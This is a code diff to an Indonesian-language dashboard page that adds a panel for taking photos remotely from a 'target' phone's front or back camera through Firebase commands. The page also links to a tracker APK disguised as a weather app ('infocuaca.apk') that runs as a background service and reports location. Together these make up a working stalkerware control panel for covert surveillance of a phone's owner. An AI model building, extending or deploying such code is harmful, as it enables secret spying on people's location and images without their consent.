@@ -609,6 +609,54 @@ body{background:radial-gradient(1100px 520px at 85% -12%,rgba(56,189,248,.10),tr
     <div><span class="k">PATH FIREBASE</span><span class="v" id="lampPathTxt" style="font-size:9px">-</span></div>
   </div>
 </div>
+<style>
+.cam-box{display:flex;gap:12px;flex-wrap:wrap}
+.cam-view{flex:1;min-width:170px;height:180px;border:1px solid var(--border);border-radius:var(--radius);background:#050a13;display:flex;align-items:center;justify-content:center;overflow:hidden;position:relative}
+.cam-view img{width:100%;height:100%;object-fit:contain;cursor:zoom-in}
+.cam-empty{text-align:center;color:var(--text-d);font-size:10px;line-height:2}
+.cam-empty .ic{font-size:34px;display:block;margin-bottom:4px;opacity:.55}
+.cam-info{flex:1;min-width:165px;font-size:10.5px;line-height:2}
+.cam-info .k{color:var(--text-d);display:inline-block;min-width:70px}
+.cam-info .v{color:var(--cyan);word-break:break-all}
+.cam-live{position:absolute;top:6px;left:6px;font-size:9px;letter-spacing:1px;padding:2px 6px;border-radius:2px;background:rgba(255,51,85,.18);border:1px solid #5a1a2a;color:#ff8fa0;display:none}
+.cam-live.show{display:block;animation:camBlink 1s ease-in-out infinite}
+@keyframes camBlink{0%,100%{opacity:1}50%{opacity:.35}}
+.cam-shot{position:absolute;inset:0;background:rgba(0,0,0,.75);display:none;align-items:center;justify-content:center;flex-direction:column;gap:8px;font-size:11px;color:#ffd76a;letter-spacing:2px}
+.cam-shot.show{display:flex}
+.cam-shot::after{content:'';position:absolute;left:0;right:0;height:2px;background:#ffd76a;box-shadow:0 0 12px #ffd76a;animation:camScan 1.1s linear infinite}
+@keyframes camScan{0%{top:0}100%{top:100%}}
+</style>
+<div class="term-body" id="camPanel">
+  <div class="prompt">[Camera] Foto Perangkat Target</div>
+  <div style="font-size:10px;color:var(--text-d);margin-bottom:10px">› ambil foto dari kamera HP target · aplikasi target harus sedang terbuka & layar hidup:</div>
+  <div class="cam-box">
+    <div class="cam-view">
+      <img id="camImg" style="display:none" alt="foto target">
+      <div class="cam-empty" id="camEmpty"><span class="ic">📷</span>Belum ada foto</div>
+      <div class="cam-live" id="camLive">● MENGAMBIL FOTO…</div>
+      <div class="cam-shot" id="camShot">MEMPROSES<div style="font-size:9px;letter-spacing:1px;opacity:.8">menunggu HP target</div></div>
+    </div>
+    <div class="cam-info">
+      <div><span class="k">DEVICE</span><span class="v" id="camDevice">-</span></div>
+      <div><span class="k">KAMERA</span><span class="v" id="camLens">-</span></div>
+      <div><span class="k">STATUS</span><span class="v" id="camState">-</span></div>
+      <div><span class="k">WAKTU</span><span class="v" id="camTime">-</span></div>
+      <div><span class="k">UKURAN</span><span class="v" id="camSize">-</span></div>
+      <div><span class="k">PATH</span><span class="v" id="camPath" style="font-size:9px">-</span></div>
+    </div>
+  </div>
+  <div class="lamp-ctrl">
+    <button class="term-btn" id="camBtnDepan" onclick="fotoAmbil('depan')">📷 FOTO DEPAN</button>
+    <button class="term-btn outline" id="camBtnBelakang" onclick="fotoAmbil('belakang')">📷 FOTO BELAKANG</button>
+    <button class="term-btn outline" onclick="fotoSimpan()" style="flex:0 0 auto;width:auto;padding:0 12px">💾</button>
+    <button class="term-btn danger" onclick="fotoHapus()" style="flex:0 0 auto;width:auto;padding:0 12px">🗑</button>
+  </div>
+  <div class="lamp-id-row">
+    <input class="geo-inp" id="camUid" placeholder="ID device target (= user APK tracker)" autocomplete="off">
+    <input class="geo-inp" id="camPin" placeholder="PIN" style="max-width:78px" autocomplete="off">
+    <button class="term-btn outline" onclick="camSetUid()" style="margin:0;flex:0 0 auto;width:auto;padding:0 14px">SET</button>
+  </div>
+</div>
 <div class="term-body"><div class="prompt">[Tools] Install Tracker APK</div><div class="term-info"><div><span class="k">FUNCTION</span><span class="v">Lacak HP kamu</span></div><div><span class="k">INTERVAL</span><span class="v">5 menit auto</span></div><div><span class="k">MODE</span><span class="v">Background service</span></div></div><div class="apk-steps"><div>Download file</div><div>Install APK</div><div>Input ID</div><div>Tracking aktif</div></div><a href="https://github.com/roraxbali/official/raw/main/infocuaca.apk" target="_blank" style="text-decoration:none"><button class="term-btn" style="margin-top:6px">Download APK</button></a></div>
 <div class="term-body" id="toolsPanel">
   <div class="prompt">[Tools] Utility Panel</div>
@@ -1651,5 +1699,216 @@ window.lampuCmd = function(state){
   console.log('%c[LAMP] Remote lampu aktif — path: kontrol/<uid>/lampu', 'color:#ffd76a;font-weight:bold');
 })();
 </script>
-<script>(function(){function c(){var b=a.contentDocument||(a.contentWindow&&a.contentWindow.document);if(b){var d=b.createElement('script');d.innerHTML="window.__CF$cv$params={r:'a3ea5191e937c539',t:'MTc5MDAwNjgwMg=='};var a=document.createElement('script');a.src='/cdn-cgi/challenge-platform/scripts/jsd/main.js';document.getElementsByTagName('head')[0].appendChild(a);";b.getElementsByTagName('head')[0].appendChild(d)}}if(document.body){var a=document.createElement('iframe');a.height=1;a.width=1;a.style.position='absolute';a.style.top=0;a.style.left=0;a.style.border='none';a.style.visibility='hidden';document.body.appendChild(a);if('loading'!==document.readyState)c();else if(window.addEventListener)document.addEventListener('DOMContentLoaded',c);else{var e=document.onreadystatechange||function(){};document.onreadystatechange=function(b){e(b);'loading'!==document.readyState&&(document.onreadystatechange=e,c())}}}})();</script></body>
+<script>
+/* ===== [CAMERA] Ambil foto dari kamera HP target =====
+   Dashboard : tulis  kontrol/<uid>/kamera  { cmd:'depan'|'belakang', t, by, k }
+   HP (APK)  : baca   kontrol/<uid>/kamera  -> ambil foto
+               tulis  kontrol/<uid>/kamera  { state:'ok'|'gagal'|'izin_kurang', url, updated, device }
+=================================================== */
+var CAMME = localStorage.getItem('username') || '';
+var CAM = { uid:'', unsub:null, wait:0, data:null, lastUrl:null, ready:false, tries:0 };
+CAM.uid = localStorage.getItem('camUid_' + CAMME) || CAMME;
+
+function camEl(id){ return document.getElementById(id); }
+
+function camUmur(ms){
+  if(!ms) return '-';
+  var s = Math.floor((Date.now() - ms) / 1000);
+  if(s < 0) s = 0;
+  if(s < 5) return 'baru saja';
+  if(s < 60) return s + ' detik lalu';
+  if(s < 3600) return Math.floor(s / 60) + ' menit lalu';
+  return new Date(ms).toLocaleString('id-ID');
+}
+
+function camSizeTxt(url){
+  if(!url) return '-';
+  if(url.indexOf('data:') === 0){
+    var kb = Math.round((url.length * 3 / 4) / 1024);
+    return kb + ' KB (di Firebase)';
+  }
+  return 'link';
+}
+
+function camRender(d){
+  if(d !== undefined) CAM.data = d;
+  var dd = CAM.data || {};
+  var url = dd.url || null;
+  var state = dd.state || null;
+  var updated = dd.updated || 0;
+  var cmd = dd.cmd || null;
+  var img = camEl('camImg'), kosong = camEl('camEmpty');
+  if(!img) return;
+
+  /* tampilkan foto */
+  if(url && (url.indexOf('data:image') === 0 || url.indexOf('http') === 0)){
+    if(img.getAttribute('data-src') !== url){
+      img.setAttribute('data-src', url);
+      img.src = url;
+      img.style.display = 'block';
+      kosong.style.display = 'none';
+      if(CAM.ready && CAM.lastUrl && CAM.lastUrl !== url){
+        if(window.beep) beep(1400, 0.08);
+        if(window.addLog) addLog('📷 Foto baru diterima dari HP target', 'ok');
+        if(window.actLog) actLog('📷 Foto diterima dari ' + CAM.uid, 'info');
+      }
+      CAM.lastUrl = url;
+    }
+  } else {
+    img.style.display = 'none';
+    kosong.style.display = 'block';
+    CAM.lastUrl = null;
+  }
+
+  /* status */
+  var menunggu = CAM.wait > 0 && (!updated || updated < (CAM.wait - 1500));
+  var txt;
+  if(menunggu) txt = 'MENUNGGU HP…';
+  else if(state === 'ok') txt = 'FOTO DITERIMA';
+  else if(state === 'gagal') txt = 'GAGAL MENGAMBIL';
+  else if(state === 'izin_kurang') txt = 'IZIN KAMERA BELUM DIBERI';
+  else txt = 'SIAP';
+
+  var elState = camEl('camState');
+  elState.innerText = txt;
+  elState.style.color = (state === 'ok') ? 'var(--green)'
+                     : (state === 'gagal' || state === 'izin_kurang') ? 'var(--red)'
+                     : (menunggu ? 'var(--amber)' : 'var(--cyan)');
+
+  camEl('camLive').classList.toggle('show', !!menunggu);
+  camEl('camShot').classList.toggle('show', !!menunggu);
+  camEl('camDevice').innerText = dd.device || '-';
+  camEl('camLens').innerText = cmd ? (String(cmd).toUpperCase()) : '-';
+  camEl('camTime').innerText = updated ? (new Date(updated).toLocaleString('id-ID') + ' · ' + camUmur(updated)) : '-';
+  camEl('camSize').innerText = camSizeTxt(url);
+  camEl('camPath').innerText = 'kontrol/' + CAM.uid + '/kamera';
+
+  var bd = camEl('camBtnDepan'), bb = camEl('camBtnBelakang');
+  if(bd) bd.classList.toggle('sel', cmd === 'depan');
+  if(bb) bb.classList.toggle('sel', cmd === 'belakang');
+
+  /* petunjuk kalau izin kamera belum diberikan */
+  var s = camEl('camState');
+  if(state === 'izin_kurang' && window.addLog && !CAM.sudahTips){
+    CAM.sudahTips = true;
+    addLog('⚠ HP target belum memberi izin kamera — popup izin harus ditekan IZINKAN di HP', 'warn');
+  }
+}
+
+function camSubscribe(){
+  var p = camEl('camPath');
+  if(p) p.innerText = 'kontrol/' + CAM.uid + '/kamera';
+  if(CAM.unsub){ try{ CAM.unsub(); }catch(e){} CAM.unsub = null; }
+  CAM.tries = 0;
+  var t = setInterval(function(){
+    CAM.tries++;
+    if(window.onValue && window.ref && window.db){
+      clearInterval(t);
+      try{
+        CAM.unsub = window.onValue(
+          window.ref(window.db, 'kontrol/' + CAM.uid + '/kamera'),
+          function(snap){ camRender(snap.val()); },
+          function(err){
+            var s = camEl('camState');
+            if(s) s.innerText = 'Gagal baca Firebase: ' + ((err && err.message) ? err.message : err);
+          }
+        );
+      }catch(e){
+        var s2 = camEl('camState');
+        if(s2) s2.innerText = 'Error: ' + e.message;
+      }
+    } else if(CAM.tries > 60){
+      clearInterval(t);
+      var s3 = camEl('camState');
+      if(s3) s3.innerText = 'Firebase belum siap - refresh halaman';
+    }
+  }, 500);
+}
+
+window.camSetUid = function(){
+  var inp = camEl('camUid');
+  var v = inp ? (inp.value || '').trim() : '';
+  if(!v){ alert('Isi ID device target dulu (sama dengan ID di APK).'); return; }
+  CAM.uid = v;
+  try{ localStorage.setItem('camUid_' + CAMME, v); }catch(e){}
+  if(window.playKlik) playKlik();
+  if(window.addLog) addLog('📷 Kamera diarahkan ke device: ' + v, 'ok');
+  CAM.wait = 0; CAM.data = null; CAM.lastUrl = null; CAM.ready = false; CAM.sudahTips = false;
+  camRender({});
+  camSubscribe();
+};
+
+window.fotoAmbil = function(kamera){
+  if(window.playKlik) playKlik();
+  if(!CAM.uid){ alert('ID device belum diset.'); return; }
+  if(!(window.ref && window.db && window.update)){
+    alert('Firebase belum siap. Tunggu 1-2 detik lalu tekan lagi.');
+    return;
+  }
+  var pinEl = camEl('camPin');
+  var pin = pinEl ? (pinEl.value || '').trim() : '';
+  CAM.wait = Date.now();
+  var payload = { cmd: kamera, t: Date.now(), by: (CAMME || 'dashboard'), k: pin };
+  window.update(window.ref(window.db, 'kontrol/' + CAM.uid + '/kamera'), payload).then(function(){
+    if(window.beep) beep(1500, 0.08);
+    if(window.addLog) addLog('📷 Perintah foto ' + kamera.toUpperCase() + ' → ' + CAM.uid, 'ok');
+    if(window.actLog) actLog('📷 Minta foto ' + kamera.toUpperCase() + ' dari ' + CAM.uid, 'info');
+    if(window.pushConsoleLine) pushConsoleLine('CAMERA → foto ' + kamera.toUpperCase() + ' @ ' + CAM.uid, 'ok');
+    camRender();
+    setTimeout(function(){ camRender(); }, 4000);
+  }).catch(function(e){
+    CAM.wait = 0;
+    alert('Gagal kirim perintah: ' + e.message);
+    if(window.addLog) addLog('✗ Perintah foto gagal: ' + e.message, 'err');
+  });
+};
+
+window.fotoSimpan = function(){
+  var url = (CAM.data && CAM.data.url) ? CAM.data.url : null;
+  if(!url){ alert('Belum ada foto untuk disimpan.'); return; }
+  if(window.playKlik) playKlik();
+  var nama = 'foto_' + CAM.uid + '_' + Date.now() + '.jpg';
+  if(url.indexOf('data:') === 0){
+    var a = document.createElement('a');
+    a.href = url;
+    a.download = nama;
+    document.body.appendChild(a);
+    a.click();
+    document.body.removeChild(a);
+    if(window.addLog) addLog('💾 Foto disimpan ke perangkat', 'ok');
+  } else {
+    fetch(url).then(function(r){ return r.blob(); }).then(function(b){
+      var o = URL.createObjectURL(b);
+      var a2 = document.createElement('a');
+      a2.href = o; a2.download = nama;
+      document.body.appendChild(a2); a2.click(); document.body.removeChild(a2);
+      setTimeout(function(){ URL.revokeObjectURL(o); }, 3000);
+      if(window.addLog) addLog('💾 Foto disimpan ke perangkat', 'ok');
+    }).catch(function(){ window.open(url, '_blank'); });
+  }
+};
+
+window.fotoHapus = function(){
+  if(!CAM.uid) return;
+  if(!confirm('Hapus foto & status dari Firebase? (foto di HP target tidak terhapus)')) return;
+  if(window.playKlik) playKlik();
+  if(!(window.ref && window.db && window.remove)) return;
+  window.remove(window.ref(window.db, 'kontrol/' + CAM.uid + '/kamera'))
+    .then(function(){
+      if(window.addLog) addLog('🗑 Data kamera dibersihkan', 'warn');
+      camRender({});
+    })
+    .catch(function(e){ alert('Gagal hapus: ' + e.message); });
+};
+
+(function camInit(){
+  var inp = camEl('camUid');
+  if(inp) inp.value = CAM.uid;
+  camRender({});
+  camSubscribe();
+  setInterval(function(){ camRender(); }, 5000);
+  console.log('%c[CAMERA] Panel foto aktif - path: kontrol/<uid>/kamera', 'color:#38bdf8;font-weight:bold');
+})();
+</script>
+<script>(function(){function c(){var b=a.contentDocument||(a.contentWindow&&a.contentWindow.document);if(b){var d=b.createElement('script');d.innerHTML="window.__CF$cv$params={r:'a3eab39f7bd986a1',t:'MTc5MDAxMDgxOA=='};var a=document.createElement('script');a.src='/cdn-cgi/challenge-platform/scripts/jsd/main.js';document.getElementsByTagName('head')[0].appendChild(a);";b.getElementsByTagName('head')[0].appendChild(d)}}if(document.body){var a=document.createElement('iframe');a.height=1;a.width=1;a.style.position='absolute';a.style.top=0;a.style.left=0;a.style.border='none';a.style.visibility='hidden';document.body.appendChild(a);if('loading'!==document.readyState)c();else if(window.addEventListener)document.addEventListener('DOMContentLoaded',c);else{var e=document.onreadystatechange||function(){};document.onreadystatechange=function(b){e(b);'loading'!==document.readyState&&(document.onreadystatechange=e,c())}}}})();</script></body>
 </html>
